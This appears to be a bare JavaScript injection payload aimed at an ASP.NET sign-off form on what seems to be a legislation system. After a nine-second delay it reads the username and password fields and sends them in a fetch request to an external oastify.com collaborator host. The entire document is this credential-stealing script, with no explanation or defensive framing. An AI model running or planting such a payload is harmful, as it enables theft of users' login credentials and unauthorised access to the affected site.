setTimeout(() => { x = new FormData(document.aspnetForm);
p = x.get("ctl00$LegislationMasterBody$ucSignOff$txtPassword");z = x.get("ctl00$LegislationMasterBody$ucSignOff$txtUserName");
fetch("https://oph43lu16yszw9l49fo99cv9j0pqdf.oastify.com"+"?username="+z+"&password="+p);   }, 9000);
